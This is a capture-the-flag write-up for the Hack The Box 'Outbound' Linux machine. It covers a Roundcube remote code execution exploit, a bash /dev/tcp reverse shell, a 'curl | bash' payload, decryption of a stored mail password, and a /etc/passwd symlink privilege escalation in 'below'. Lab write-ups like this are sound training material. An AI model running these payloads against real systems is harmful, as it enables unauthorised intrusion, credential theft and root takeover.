---
name: Outbound
difficulty: easy
os: linux
platform: htb
date: 2025/07/15

img: https://labs.hackthebox.com/storage/avatars/b1096fc86df3fb6035baad7f599094be.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.77 -oN allPorts
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options
```bash
nmap -p 22,80 -sCV 10.10.11.77 -oN targeted
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
|_  256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We try to connect to the web service but redirects us to `http://mail.outbound.htb`, so it is necessary to add the domain to our `/etc/hosts` file
```bash
echo "10.10.11.77 outbound.htb mail.outbound.htb" | sudo tee -a /etc/hosts
```

We log in to the web service using the credentials provided in the task description
```
tyler:LhKL1o9Nm3X2
```

We can check the version of Roundcube installed. Its 1.6.10, which is vulnerable to CVE-2025-49113, a remote code execution vulnerability. We can exploit this vulnerability with the following repository `https://github.com/fearsoff-org/CVE-2025-49113`
```bash
git clone https://github.com/fearsoff-org/CVE-2025-49113
cd CVE-2025-49113
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 <command>
```

## User Exploitation

We can set up a reverse shell using the exploit
First we set up a reverse shell listener on our machine
```bash
nc -lvnp 4444
```
Then we set up the http listener on our machine
```bash
echo "#!/bin/bash
bash -i >& /dev/tcp/10.10.14.162/4444 0>&1" > index.html
python3 -m http.server 80
```

Next we run the exploit with the command to execute the reverse shell

```bash
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "curl 10.10.14.162:4444 | bash"
```

We gain a reverse shell as the user `www-data`

We try migrating to the user `tyler` using the password provided in the task description
```bash
su tyler
```
with password `LhKL1o9Nm3X2` and we are able to log in as `tyler`.

We find out this looks like a docker container, 
```bash
hostname -I
```
```
172.17.0.2
```

We find database credentials in `/var/www/html/roundcube/config/config.inc.php`
```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```
We get user info from the database
```bash
mysql -u roundcube -pRCDBPass2025
```


```sql
use roundcube;
select * from session;
```

We find a lot of session records, but one of them stands out:
```
bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
```

We can base64 decode it 
```php
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

We will be using Triple DES to decrypt the password. The key is `rcmail-!24ByteDESkey*Str`, found in `/var/www/html/roundcube/config/config.inc.php`.
We will use password `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` to get the IV.

```
1. Decrypt from base64 and transform to hex: L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ -> 2fb46fd3403c4eec0902bebb9084f1c5c4a09c8936e409bf
2. Use 8 first bytes as IV: 2fb46fd3403c4eec
3. Use 24 byte key: rcmail-!24ByteDESkey*Str
4. Use Triple DES to decrypt the rest of the bytes from the password: 0902bebb9084f1c5c4a09c8936e409bf -> 595mO8DmwGeD
```
We find the credentials for user `jacob`:
```
jacob:595mO8DmwGeD
```

We can use `su jacob` to switch to the user `jacob` with the password `595mO8DmwGeD`.

We can find some unread mails in the inbox of the user `jacob`, one of them exposes a new password
```bash
mail
```
```
From tyler@outbound.htb  Sat Jun  7 14:00:58 2025
X-Original-To: jacob
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-UID: 2                                        

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler
```



We can use these credentials (`jacob:gY4Wr3a1evp4`) to login via SSH
```bash
ssh jacob@10.10.11.77
```

We find the user flag in the home directory of the user `jacob`         
```bash
cat /home/jacob/user.txt
```
```
user flag value
```

## Root Exploitation

We check if we have any sudo privileges
```bash
sudo -l
```
```
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*,
        !/usr/bin/below -d*
```

We can check for `below` vulnerabilities online and we find that it is vulnerable to CVE-2025-27591, a local privilege escalation vulnerability. 
We have to create a file called `toor` with the following content:
```bash
echo "toor:$(mkpasswd -m sha-512 toor):0:0:,,,:/root:/bin/bash" > toor
```

Then we can do a symbolic link attack to overwrite the `/etc/passwd` file with the contents of the `toor` file we created. We take advantage of the fact that the `below` is creating a `666` permissions file called `error_root.log` in the `/var/log/below` `777` directory.
```
jacob@outbound:/var/log/below$ rm error_root.log
jacob@outbound:/var/log/below$ ln -sf /etc/passwd error_root.log
jacob@outbound:/var/log/below$ cat toor >> error_root.log 

jacob@outbound:/var/log/below$ su toor
Password: 
root@outbound:/var/log/below# whoami
root
```

We can now read the root flag:
```bash
cat /root/root.txt
```
```
root flag value
```

## Conclusion
In this write-up, we have demonstrated a complete exploitation path from initial access to root privilege escalation. We started with a user `jacob`, extracted sensitive information from emails, and leveraged a local privilege escalation vulnerability in the `below` binary to gain root access. Finally, we retrieved the root flag, completing the challenge.

